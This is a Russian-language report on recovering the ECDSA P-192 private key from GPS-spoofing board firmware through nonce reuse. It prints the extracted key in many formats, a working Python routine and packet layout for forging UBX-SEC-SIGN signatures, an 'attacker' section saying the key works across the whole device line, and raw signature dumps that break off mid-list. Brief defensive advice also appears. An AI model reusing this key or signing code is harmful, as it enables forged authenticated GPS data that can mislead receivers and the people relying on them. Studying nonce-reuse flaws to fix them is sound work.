# Отчёт по извлечённому ключу белой платы GPS спуфинга

**Дата:** 2025-12-17
**Метод:** Nonce Reuse Attack (ECDSA)
**Источник:** white_board_1.csv (28 подписей)

---

## Криптографические параметры

### Эллиптическая кривая: SECP192R1 (NIST P-192)

```
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFF
a  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFC
b  = 0x64210519E59C80E70FA7E9AB72243049FEB8DEECC146B9B1
n  = 0xFFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22831
Gx = 0x188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
Gy = 0x07192B95FFC8DA78631011ED6B24CDD573F977A11E794811
```

**Размеры:**
- Порядок группы n: 192 бита
- Координаты точек: 192 бита (24 байта)
- Компоненты подписи R, S: по 24 байта

---

## Извлечённые ключи

### Приватный ключ (СЕКРЕТНЫЙ)

> **⚠️ ПРИВАТНЫЙ КЛЮЧ — НЕ ПУБЛИКОВАТЬ!**

**d = `0xeaa5c0111e18dbd17adb3dc9394bfb451f9d5e83f93822c7`**

**Во всех форматах:**

| Формат | Значение |
|--------|----------|
| **Hex с 0x** | **`0xeaa5c0111e18dbd17adb3dc9394bfb451f9d5e83f93822c7`** |
| **Hex без префикса** | **`eaa5c0111e18dbd17adb3dc9394bfb451f9d5e83f93822c7`** |
| **Hex UPPERCASE** | **`EAA5C0111E18DBD17ADB3DC9394BFB451F9D5E83F93822C7`** |
| Decimal | `5753539026012897377593474724667688475345506713649488077511` |
| Bytes (пробелы) | `ea a5 c0 11 1e 18 db d1 7a db 3d c9 39 4b fb 45 1f 9d 5e 83 f9 38 22 c7` |
| C/Arduino array | `0xea, 0xa5, 0xc0, 0x11, 0x1e, 0x18, 0xdb, 0xd1, 0x7a, 0xdb, 0x3d, 0xc9, 0x39, 0x4b, 0xfb, 0x45, 0x1f, 0x9d, 0x5e, 0x83, 0xf9, 0x38, 0x22, 0xc7` |
| **Base64** | **`6qXAER4Y29F62z3JOUv7RR+dXoP5OCLH`** |
| Base64 URL-safe | `6qXAER4Y29F62z3JOUv7RR-dXoP5OCLH` |
| uint32_t[6] | `{ 0xeaa5c011, 0x1e18dbd1, 0x7adb3dc9, 0x394bfb45, 0x1f9d5e83, 0xf93822c7 }` |
| Python bytes | `b'\xea\xa5\xc0\x11\x1e\x18\xdb\xd1\x7a\xdb\x3d\xc9\x39\x4b\xfb\x45\x1f\x9d\x5e\x83\xf9\x38\x22\xc7'` |

**Создать бинарный файл:**
```bash
echo 'eaa5c0111e18dbd17adb3dc9394bfb451f9d5e83f93822c7' | xxd -r -p > private_key.bin
```

---

### Публичный ключ

**Qx = `0x1b24ad3ab6d249370c4c590d4a2a7dad979bccce93542904`**

**Qy = `0x9f9e4936a0161a4034e6f57f5acd889a59d385fd452b1adc`**

**Во всех форматах:**

| Формат | Значение |
|--------|----------|
| **Uncompressed (04‖Qx‖Qy)** | **`041b24ad3ab6d249370c4c590d4a2a7dad979bccce935429049f9e4936a0161a4034e6f57f5acd889a59d385fd452b1adc`** |
| **Base64** | **`BBskrTq20kk3DExZDUoqfa2Xm8zOk1QpBJ+eSTagFhpANOb1f1rNiJpZ04X9RSsa3A==`** |
| Qx hex | `1b24ad3ab6d249370c4c590d4a2a7dad979bccce93542904` |
| Qy hex | `9f9e4936a0161a4034e6f57f5acd889a59d385fd452b1adc` |
| Qx bytes | `1b 24 ad 3a b6 d2 49 37 0c 4c 59 0d 4a 2a 7d ad 97 9b cc ce 93 54 29 04` |
| Qy bytes | `9f 9e 49 36 a0 16 1a 40 34 e6 f5 7f 5a cd 88 9a 59 d3 85 fd 45 2b 1a dc` |

**Примечание:** Несжатый формат начинается с байта `04`, за которым следуют Qx (24 байта) и Qy (24 байта). Всего 49 байт.

---

## Уязвимость

### Описание

Прошивка белой платы содержит критическую уязвимость в генераторе случайных чисел (RNG).
При создании ECDSA подписей используется **статический или предсказуемый nonce k**.

### Доказательство

В логе white_board_1.csv из 28 подписей:
- Подписи #1, #2, #3 имеют уникальные R
- Подписи #4-28 (25 штук) имеют **ИДЕНТИЧНЫЙ R**:
  ```
  R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
  ```

Одинаковый R означает одинаковый nonce k, что позволяет алгебраически восстановить приватный ключ.

### Формулы атаки

При двух подписях (r, s1, z1) и (r, s2, z2) с одинаковым r:

```
k = (z1 - z2) * (s1 - s2)^(-1) mod n
d = (s1 * k - z1) * r^(-1) mod n
```

Восстановленный nonce:
```
k = 0x000000060000000500000004000000030000000200000001
```

Паттерн nonce указывает на использование простого счётчика вместо криптографически стойкого RNG.

---

## Верификация

### Результаты проверки подписей

| Файл | Подписей | Верифицировано | Уникальных R |
|------|----------|----------------|--------------|
| white_board_1.csv | 28 | 28 (100%) | 4 |
| white_board_2.csv | 15 | 15 (100%) | 3 |
| air3s.csv | 8 | 8 (100%) | 8 |
| **Итого** | **51** | **51 (100%)** | - |

### Важное наблюдение

Устройство air3s использует **тот же приватный ключ**, но имеет исправленный RNG (все R уникальны).
Это означает, что ключ зашит в прошивку и одинаков для всех устройств линейки.

---

## Код для подписи

### Python (чистая реализация)

```python
import hashlib
import secrets

# Параметры SECP192R1
p = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFF
a = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFFFFFFFFFFFC
n = 0xFFFFFFFFFFFFFFFFFFFFFFFF99DEF836146BC9B1B4D22831
Gx = 0x188DA80EB03090F67CBF20EB43A18800F4FF0AFD82FF1012
Gy = 0x07192B95FFC8DA78631011ED6B24CDD573F977A11E794811
G = (Gx, Gy)

# Приватный ключ
d = 0xeaa5c0111e18dbd17adb3dc9394bfb451f9d5e83f93822c7

def mod_inv(a, m):
    return pow(a, -1, m)

def point_add(P, Q):
    if P is None: return Q
    if Q is None: return P
    x1, y1 = P
    x2, y2 = Q
    if x1 == x2:
        if y1 != y2: return None
        lam = (3 * x1 * x1 + a) * mod_inv(2 * y1, p) % p
    else:
        lam = (y2 - y1) * mod_inv(x2 - x1, p) % p
    x3 = (lam * lam - x1 - x2) % p
    y3 = (lam * (x1 - x3) - y1) % p
    return (x3, y3)

def point_mul(k, P):
    result = None
    addend = P
    while k:
        if k & 1:
            result = point_add(result, addend)
        addend = point_add(addend, addend)
        k >>= 1
    return result

def ecdsa_sign(z, d):
    """Создаёт ECDSA подпись"""
    while True:
        k = secrets.randbelow(n - 1) + 1
        R_point = point_mul(k, G)
        r = R_point[0] % n
        if r == 0: continue
        k_inv = mod_inv(k, n)
        s = (k_inv * (z + r * d)) % n
        if s == 0: continue
        return r, s

def fold_sha256_to_192(digest):
    """Folding SHA256 к 192 битам"""
    folded = bytearray(digest[:24])
    for i in range(8):
        folded[i] ^= digest[24 + i]
    return bytes(folded)

def compute_z(sha256_field, session_id=bytes(24)):
    """Вычисляет z для UBX-SEC-SIGN"""
    to_sign = sha256_field + session_id
    final_hash = hashlib.sha256(to_sign).digest()
    z_bytes = fold_sha256_to_192(final_hash)
    return int.from_bytes(z_bytes, 'big')

# Пример использования:
# message_hash = hashlib.sha256(b"your UBX messages").digest()
# z = compute_z(message_hash)
# r, s = ecdsa_sign(z, d)
```

---

## Структура UBX-SEC-SIGN

### Формат сообщения

```
Header: B5 62 27 04 6C 00
Payload (108 байт):
  [0:2]    Version (uint16_LE) = 0x0001
  [2:4]    Packet Count (uint16_LE)
  [4:36]   SHA256 field (32 байта)
  [36:60]  Session ID (24 байта, обычно нули)
  [60:84]  R (24 байта, big-endian)
  [84:108] S (24 байта, big-endian)
Checksum: CK_A CK_B
```

### Вычисление z

```
1. sha256_field = SHA256(все UBX сообщения между подписями)
2. to_sign = sha256_field || session_id  (56 байт)
3. final_hash = SHA256(to_sign)  (32 байта)
4. z = fold(final_hash)  (24 байта)
   - z[0:24] = final_hash[0:24]
   - z[0:8] ^= final_hash[24:32]
5. z_int = int.from_bytes(z, 'big')
```

---

## Рекомендации

### Для атакующего
1. Ключ позволяет подписывать любые GPS данные
2. Можно создавать поддельные UBX-SEC-SIGN пакеты
3. Ключ работает на всех устройствах линейки (подтверждено на air3s)

### Для защиты
1. Генерировать уникальный ключ для каждого устройства
2. Использовать криптографически стойкий RNG для nonce
3. Рассмотреть использование детерминистического ECDSA (RFC 6979)

---

## Файлы

- `white_board_1.csv` - основной лог (28 подписей, nonce reuse)
- `white_board_2.csv` - дополнительный лог (15 подписей)
- `air3s.csv` - лог с устройства air3s (8 подписей, исправленный RNG)
- `KEY_REPORT.md` - этот отчёт

---

**Статус:** Ключ полностью скомпрометирован
**Уровень критичности:** КРИТИЧЕСКИЙ


---

## Полный список подписей из логов

### white_board_1.csv (28 подписей)

| # | R (hex) | S (hex) | z (hex) | Msgs |
|---|---------|---------|---------|------|
| 1 | `334c813ec7de97ec...` | `74ea9d113914b849...` | `3445b6e54f52e909...` | 63 |
| 2 | `60fe6e7d40d24edf...` | `ceee62779db9f3b6...` | `42d7bb02677d74da...` | 119 |
| 3 | `2c471c4d350093de...` | `e5586f9cc8ff5d7b...` | `ed4bcb5fdc0f9295...` | 124 |
| 4 | `4c9b5ed1894f60a3...` | `3795a8fb316c8393...` | `9271d47aee088cd1...` | 224 |
| 5 | `4c9b5ed1894f60a3...` | `5b9a596e0d1d0170...` | `a80422cc22185744...` | 224 |
| 6 | `4c9b5ed1894f60a3...` | `dc596c8912f90846...` | `9f66d747f54ec600...` | 224 |
| 7 | `4c9b5ed1894f60a3...` | `7d491347739f7583...` | `9ef4206cf703fcf9...` | 224 |
| 8 | `4c9b5ed1894f60a3...` | `3185cb00019c49a1...` | `a287f2f62f6664b0...` | 224 |
| 9 | `4c9b5ed1894f60a3...` | `c70a9a5fc95f6593...` | `21ddda6284401083...` | 224 |
| 10 | `4c9b5ed1894f60a3...` | `c1c43cabc33d7acd...` | `2731927cf7477889...` | 224 |
| 11 | `4c9b5ed1894f60a3...` | `f342cf97d1fe8b47...` | `be9a1bd477131e09...` | 224 |
| 12 | `4c9b5ed1894f60a3...` | `a85930c08a328f62...` | `40ef8808204a708d...` | 224 |
| 13 | `4c9b5ed1894f60a3...` | `79b47181af6a5963...` | `511a5f0f1fd2e27c...` | 224 |
| 14 | `4c9b5ed1894f60a3...` | `8043562978e684bb...` | `47d77be09f421dbe...` | 224 |
| 15 | `4c9b5ed1894f60a3...` | `05fa210e8be4f8bc...` | `98ff90fe3d7985f5...` | 224 |
| 16 | `4c9b5ed1894f60a3...` | `75d06ae4486761e2...` | `cca97fbd469c20a2...` | 224 |
| 17 | `4c9b5ed1894f60a3...` | `ffeb7e285d233163...` | `19c69b1a9ca0a4e0...` | 224 |
| 18 | `4c9b5ed1894f60a3...` | `592428666142c893...` | `5a8e2b2d123866ab...` | 224 |
| 19 | `4c9b5ed1894f60a3...` | `9e794397ffcc9f4d...` | `b25493f4a546afcd...` | 224 |
| 20 | `4c9b5ed1894f60a3...` | `8df680dfa1b6df3e...` | `40eaed766191dff4...` | 224 |
| 21 | `4c9b5ed1894f60a3...` | `43b0ae37269a3c82...` | `8f8e2f746889ff49...` | 224 |
| 22 | `4c9b5ed1894f60a3...` | `4ee8ea676c673c4a...` | `ce352b38f10d8f0b...` | 224 |
| 23 | `4c9b5ed1894f60a3...` | `96dd68cfb417ecc7...` | `5e282f0fb3aa8a83...` | 224 |
| 24 | `4c9b5ed1894f60a3...` | `2ae8985940c22f26...` | `fa1c92e3a8ce8c9a...` | 224 |
| 25 | `4c9b5ed1894f60a3...` | `1cd7aa448b726f71...` | `8b79d1c14f757aa5...` | 224 |
| 26 | `4c9b5ed1894f60a3...` | `2b3122136361f5b9...` | `97679bf53fb93cf9...` | 224 |
| 27 | `4c9b5ed1894f60a3...` | `b5a9d124aad487ee...` | `94f47dae591c3606...` | 224 |
| 28 | `4c9b5ed1894f60a3...` | `e2494c41bf5ce596...` | `fb44fc540ecb6765...` | 224 |

#### Полные данные white_board_1.csv

**Подпись #1**
```
R = 0x334c813ec7de97eccff36fbda8607d0bbc16b64d0064905e
S = 0x74ea9d113914b8495ef146816c599bd49dcf86ae948836a9
z = 0x3445b6e54f52e909ded881d27cca376ffe97ff32b263cd12
SHA256(messages) = 2e9c60f27461ceea87ffc19779384eab71d9cd521cd76de1245f1489af30a1b7
Сообщений в блоке: 63
```

**Подпись #2**
```
R = 0x60fe6e7d40d24edfbb954309df1f314d40c6af717ef3c503
S = 0xceee62779db9f3b6b9a66f15e2468b6f74c2332c60805f40
z = 0x42d7bb02677d74da83f7ca53b8d22d0cc8824d227a57516c
SHA256(messages) = 7cd789de43e25287f1d74d733aff6a5d3c23d3719fd7d2ad254126444bbf7776
Сообщений в блоке: 119
```

**Подпись #3**
```
R = 0x2c471c4d350093de6799c0acd1decd2249434605cb53020f
S = 0xe5586f9cc8ff5d7baaabfe8568e188c8f7bb584383e5fbc4
z = 0xed4bcb5fdc0f929538520874c08c20ebea3d9bc9f435d96a
SHA256(messages) = 867cf7db5af6af622cab4d11d81c40b248204c05c6000f8e99f59b9e8bbff724
Сообщений в блоке: 124
```

**Подпись #4**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x3795a8fb316c83931f62ddc8c786c24a804650c1b0c1cb76
z = 0x9271d47aee088cd1ae9653abbb3b36c870f12fe8ee254840
SHA256(messages) = a4ac8680a04d51f910194d649cd5325b54df486787b28f093cfff28d99aac892
Сообщений в блоке: 224
```

**Подпись #5**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x5b9a596e0d1d017051347b3acd838bac5ece9805c06511c1
z = 0xa80422cc22185744eacc1b6df0faeebf3ad71ca17044bd9c
SHA256(messages) = 4a2409ddfc102a202eb0c84929efc2b68c8d0271f3a7e05be3f8ec9f9ed76c62
Сообщений в блоке: 224
```

**Подпись #6**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xdc596c8912f9084648ad3efef903f720f3adab5e27a0347a
z = 0x9f66d747f54ec60014535d94df885b7cee47ad7b195bba79
SHA256(messages) = 86e452e5238a72411d379f3c6b5b83eaf97c9706e4bfad64a9b357ecafb32127
Сообщений в блоке: 224
```

**Подпись #7**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x7d491347739f75831900d5c3c3d64a504d8fd45bfa35f1df
z = 0x9ef4206cf703fcf9ae4f80424e12bf726f4c769b8ec20995
SHA256(messages) = bb8554f1b188145080c82fd071cbc8c78ba7ac400ce398527c930f7f3fd4e635
Сообщений в блоке: 224
```

**Подпись #8**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x3185cb00019c49a160932df3eb00494abe7bca8b7a898cd8
z = 0xa287f2f62f6664b000dee6ebd1408ebba5f7fa55cc0a0b81
SHA256(messages) = 91afd2b63ca14480701a5b60125019a0e3fca555a6c0ef1ef584e3d2cb454142
Сообщений в блоке: 224
```

**Подпись #9**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xc70a9a5fc95f6593199a4acad1fea761bcd89985e512d788
z = 0x21ddda6284401083bb28e0e0d19d2878703d3abbf60f7b86
SHA256(messages) = 7525de0d79f803d9edec7ed9f6d3778eab052f047a5c9e31647d08fff6c0dff0
Сообщений в блоке: 224
```

**Подпись #10**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xc1c43cabc33d7acd331fcf59e41c57b3227747f04e36945c
z = 0x2731927cf7477889de759abf3250da05d42e1d0eb2e886ff
SHA256(messages) = 0280261d6e5a55e2bb174d5eebc716c028d7bb8d04022defa1cb15d3aad5a9ed
Сообщений в блоке: 224
```

**Подпись #11**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xf342cf97d1fe8b472b6764e7ae5810bb9356000f89953b5d
z = 0xbe9a1bd477131e097def16ecb24c7293a355c5e713fefaa3
SHA256(messages) = 0339a63922f2f815c64f872faea932f7b1aa2e15a954cf3ed6b67e28403e18f1
Сообщений в блоке: 224
```

**Подпись #12**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xa85930c08a328f62be081f6f7ba062455eabae27a06454de
z = 0x40ef8808204a708d65e760605065e3f11e24b861372563fd
SHA256(messages) = 258e06b8f7795fb0d6c05d16c3296d695175c1e0094b59e60388316a299632e7
Сообщений в блоке: 224
```

**Подпись #13**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x79b47181af6a5963b5e0901c1af9b24b9d1ce9a1d4b07d73
z = 0x511a5f0f1fd2e27c6dfd743bb8c3ac979cf4a794df7b60c2
SHA256(messages) = 12b605614280f99ab6328118ecec833a06994c32b566f6e63312696f778a7878
Сообщений в блоке: 224
```

**Подпись #14**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x8043562978e684bb6dc131a01fdbc83505f85f1301ad8d40
z = 0x47d77be09f421dbe20d999a205d55d515b0c7dbf20a89a78
SHA256(messages) = 8112f558e920c8737b265b908fdef3c219bda5a3ebdac9a2703344e04aaca55b
Сообщений в блоке: 224
```

**Подпись #15**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x05fa210e8be4f8bcfb112528be5631dbb3933af5d4060fc3
z = 0x98ff90fe3d7985f5d8583816239b33f6005e81783aa90ebb
SHA256(messages) = 107390fcba485dd78966e3e6928ae109e98a3dae63a68a2dcf6cf99b2396866f
Сообщений в блоке: 224
```

**Подпись #16**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x75d06ae4486761e2d4638d7e85b29b0529ddea5ea301f8ff
z = 0xcca97fbd469c20a211e9f71b3385798545040cd0ac4021b2
SHA256(messages) = 7b04bec482771f3f6d6e57f517f8712a369f6d719ad93f4ef24efa6fb0d67470
Сообщений в блоке: 224
```

**Подпись #17**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xffeb7e285d2331633f940e90c476b8ad45dd1fc8d0d85a63
z = 0x19c69b1a9ca0a4e019de46c6fec6fdc7616f5647285cb953
SHA256(messages) = 3b46736c8159257b0d461019e2cd06bce2f2fdc2e3c5ccb7fe3947418cab2637
Сообщений в блоке: 224
```

**Подпись #18**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x592428666142c8937cd3bd9fdbdf641da9aad9be795e0e97
z = 0x5a8e2b2d123866abc13e1c05113fe0d198a72a866446a9b9
SHA256(messages) = 7df9b66aca4a9356196e95b38b5a6f35a1e039ad21e212503c62b2cd0284c583
Сообщений в блоке: 224
```

**Подпись #19**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x9e794397ffcc9f4d92681402511db6600cd62114225b8325
z = 0xb25493f4a546afcdf4c85df89a890bf5d598779cdf8ee4b9
SHA256(messages) = fdeb9136dafe89f55b28dc0df707f582f2a7673dc754b46d3e6733bf2f899e0a
Сообщений в блоке: 224
```

**Подпись #20**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x8df680dfa1b6df3ec397714f89f963e404cc27ab323809f2
z = 0x40eaed766191dff4cd396003f1df32c16438b78ff47c8319
SHA256(messages) = 017ae2ae15974998f7be6663105d26c016a54c0654a3b3e60f0e505ca9a0e31e
Сообщений в блоке: 224
```

**Подпись #21**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x43b0ae37269a3c822c078bf573c12d129fd610b2fc0b1786
z = 0x8f8e2f746889ff4928e75259e07a5cae7e13bc6674e04915
SHA256(messages) = 600788ac3a2a6daf6574eef817249307a434ca39dc3b25885519953da013bd4a
Сообщений в блоке: 224
```

**Подпись #22**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x4ee8ea676c673c4a375c272c75fdd0c35d314c66cc6b91bc
z = 0xce352b38f10d8f0bbf135df97b16c9374aec64e4bbf31c91
SHA256(messages) = 775e7cc47c757dad9408d4050880cdaa747606028fd8da03a66e1b205ac71c93
Сообщений в блоке: 224
```

**Подпись #23**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x96dd68cfb417ecc7b2cccf176ca488afd748e12b1351ab03
z = 0x5e282f0fb3aa8a83c34b10f024686180f045672baeded31f
SHA256(messages) = 2cfceff2dfd878a4fc0aaee116c8292ac3ea3c2178956f9dca3c910d3bf3aba7
Сообщений в блоке: 224
```

**Подпись #24**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x2ae8985940c22f264b75b5c51f879e4169ed9cf8ecae65aa
z = 0xfa1c92e3a8ce8c9ad846b8fcde1d79f446fbc743593eff47
SHA256(messages) = 82ec45fc0542c6cceda6d590018e8ff460b02b4203500bf8ee784dec10e3bb56
Сообщений в блоке: 224
```

**Подпись #25**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x1cd7aa448b726f71a21a71587f0f5ef5993302d10b9f06cf
z = 0x8b79d1c14f757aa5193bd9b818c44202740c8db001de2351
SHA256(messages) = 232ad988952a66d02b77b86b9a846ff4a28eecc922c82e87f968401932096fb4
Сообщений в блоке: 224
```

**Подпись #26**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x2b3122136361f5b99f7a0d601cad1b38cf7ad481290cc881
z = 0x97679bf53fb93cf9ec811a0744af41ca966925cb702a062a
SHA256(messages) = ef0ce943d7ebc74100c7dddbf08d27c8f90c20263f445f55688a2ba6fe674e2e
Сообщений в блоке: 224
```

**Подпись #27**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xb5a9d124aad487eeb8e06624cc24f7695635906ea18dee9d
z = 0x94f47dae591c36062bd3e55d4e6ee8e1470d2a05daa5add0
SHA256(messages) = 4907ea3ab0c984f18e5d4c40101350e88b08293c209c56106692c0710b86a91d
Сообщений в блоке: 224
```

**Подпись #28**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xe2494c41bf5ce596b9f50471228125fbf70b9d78faf5053e
z = 0xfb44fc540ecb6765eb7a678887e85790757541bd3886dcfa
SHA256(messages) = 8e1453224561fc615cedf29a100e6e6567f5b93a8f4986e1935cb1dd77d9c8c0
Сообщений в блоке: 224
```

---

### white_board_2.csv (15 подписей)

| # | R (hex) | S (hex) | z (hex) | Msgs |
|---|---------|---------|---------|------|
| 1 | `8427c5d69ed36db8...` | `ac0a83a63a3d3b9d...` | `3a6d48f9b53350dd...` | 8 |
| 2 | `c443ecf0961ae489...` | `ea9d0a39079107cf...` | `6aed0ada2b0d2df0...` | 139 |
| 3 | `4c9b5ed1894f60a3...` | `32ca1a5fbf68745f...` | `35c8766e1376b9b9...` | 224 |
| 4 | `4c9b5ed1894f60a3...` | `81b3562f796eaf35...` | `9229ee09f3bec95d...` | 224 |
| 5 | `4c9b5ed1894f60a3...` | `dfb001521ed4d24a...` | `d917bee9572c7cc5...` | 224 |
| 6 | `4c9b5ed1894f60a3...` | `104b38e150defffe...` | `2b8282e2bf5e0d81...` | 224 |
| 7 | `4c9b5ed1894f60a3...` | `ea4f29d444a34f8c...` | `92b3c73840a8676d...` | 224 |
| 8 | `4c9b5ed1894f60a3...` | `8a8176a5686f2162...` | `dc71b46d34fd10b0...` | 224 |
| 9 | `4c9b5ed1894f60a3...` | `7145ed67d06661e0...` | `c180790bbd036ba9...` | 224 |
| 10 | `4c9b5ed1894f60a3...` | `59441de7814df85d...` | `db6ceca4cc3bb2fd...` | 224 |
| 11 | `4c9b5ed1894f60a3...` | `803bb96ee504e8d7...` | `6b7a6ebd7fd654fc...` | 224 |
| 12 | `4c9b5ed1894f60a3...` | `0ea5d5dd1c8e0388...` | `fbb4f67ac3c8f837...` | 224 |
| 13 | `4c9b5ed1894f60a3...` | `abbfda0addcbf6b9...` | `f168176f6d31c060...` | 224 |
| 14 | `4c9b5ed1894f60a3...` | `088e8e1795854ca1...` | `a9145750c1f846dd...` | 224 |
| 15 | `4c9b5ed1894f60a3...` | `d963b289ef3f0077...` | `5159edf554269431...` | 224 |

#### Полные данные white_board_2.csv

**Подпись #1**
```
R = 0x8427c5d69ed36db8d56907893b102900f5bdf47eb0eefe50
S = 0xac0a83a63a3d3b9d2ca3d5f13809f6d19f3a2ecbc06cb43f
z = 0x3a6d48f9b53350dd04892d1fb21adf7410a0d387ee37b35f
SHA256(messages) = 3ad23fc7656e79d9b3dcb4abdb0dcee7440ba5ae49b56dc47fe41a6043d10f88
Сообщений в блоке: 8
```

**Подпись #2**
```
R = 0xc443ecf0961ae489958db8c16490635023369c85146b91b5
S = 0xea9d0a39079107cfc64765c8fc6b9c11d38c100730005249
z = 0x6aed0ada2b0d2df064401556a6ccc91d7fb9bee577beba77
SHA256(messages) = 38c6094a6bc196228fcc680886f0f20599c1bdd0c088cc83520989e61fe61b5c
Сообщений в блоке: 139
```

**Подпись #3**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x32ca1a5fbf68745f7d72bd8a8e37ab7fba87e774478f21f3
z = 0x35c8766e1376b9b93d5dd9c29e750a9540ef68edf2454fd2
SHA256(messages) = 97190b8eecbc7a41f1f5ac63a2b2a74ec561904f36c3e8afa8e49e552760d1d8
Сообщений в блоке: 224
```

**Подпись #4**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x81b3562f796eaf35abc7588afe6f9842533fe094b260699a
z = 0x9229ee09f3bec95df8322560f0a399e6d41c87d56fbe731c
SHA256(messages) = 954b4540ed1f4b048ed479b4284d02d34325ac4ef265193a2a74034df2fad364
Сообщений в блоке: 224
```

**Подпись #5**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xdfb001521ed4d24a65936514a9786f6a28f067950e688c22
z = 0xd917bee9572c7cc53623ed4eaaf27c981ac299d77e385bed
SHA256(messages) = 4fbf78db3a9eceb05ce788e4c62d602d0f2db32e00b97a4067c574fbb8a9332e
Сообщений в блоке: 224
```

**Подпись #6**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x104b38e150defffe85c55713d5257c8ce91927066af23e51
z = 0x2b8282e2bf5e0d8143f9fc57d3780e74a452a9e2a1bb6f22
SHA256(messages) = 5ec9ee9d9de68995d197379cfd7570eff8a5ba0ce8ee610e31adcd310f4457a5
Сообщений в блоке: 224
```

**Подпись #7**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xea4f29d444a34f8c8f209f26fbf4aa11ef5cfe591cb6c3b4
z = 0x92b3c73840a8676d25be572c19937f9c45304769840b7ac6
SHA256(messages) = 60078bdb3a4f941ff1a41ec0bbccca89e85ab2f7832864ad3bbd162633502dda
Сообщений в блоке: 224
```

**Подпись #8**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x8a8176a5686f21627245e91e414ff479d28fa204e428aa60
z = 0xdc71b46d34fd10b0f70eab2b361ffd33a5a2ad68c069a12b
SHA256(messages) = 16f13a5d96708080b53621594e79038b55bed0c81ab2208b6bcd26e9d5fcb58d
Сообщений в блоке: 224
```

**Подпись #9**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x7145ed67d06661e0f41769f82c5992497d8ebb0935efbf74
z = 0xc180790bbd036ba9b2b790a593eae5066d731a977c88c4d6
SHA256(messages) = dccb80909e060cba7d9eb576a82dec3c44ebdd08431e2555caa4e8d7a83eb51c
Сообщений в блоке: 224
```

**Подпись #10**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x59441de7814df85debc5f6b475f03e1e09882d0797f24b3c
z = 0xdb6ceca4cc3bb2fdb15f1a310756446f31c82cfb51bc2046
SHA256(messages) = b53ce4c096a1f5f5543549519749bc63aa37a4efcc143d77f798371a673a3218
Сообщений в блоке: 224
```

**Подпись #11**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x803bb96ee504e8d7261fd24f0445c9230018bbce9747f708
z = 0x6b7a6ebd7fd654fc778240c61bf2f07c72b31228190e4401
SHA256(messages) = 9ee5cf23bf88a06a67599dc34cb5df22420d43174605f4467565aa31e144a9fd
Сообщений в блоке: 224
```

**Подпись #12**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0x0ea5d5dd1c8e038859b4f6c33d54e21f727bc360f4199e48
z = 0xfbb4f67ac3c8f8372f49affb63a336491ff1cc2dc9a9f55d
SHA256(messages) = 0325152155816200ea7d8adbc698a3b1606655323d756129c9003b57eec939da
Сообщений в блоке: 224
```

**Подпись #13**
```
R = 0x4c9b5ed1894f60a3989f041cf399f8a8fdb50b9f8cadae66
S = 0xabbfda0addcbf6b9d7f91bdd620fd2ed24c27bcd3ce24d96
z = 0xf168176f6d31c060394439c6e23c931f949e16afe36a5bf0
SHA256(messages) = 6887341706ebe024125e5f5b3dc3f1d3a8da4ea2e4b273d108cc08a55079c153
Сообщений в блоке: 224
```

**Подпись #14**
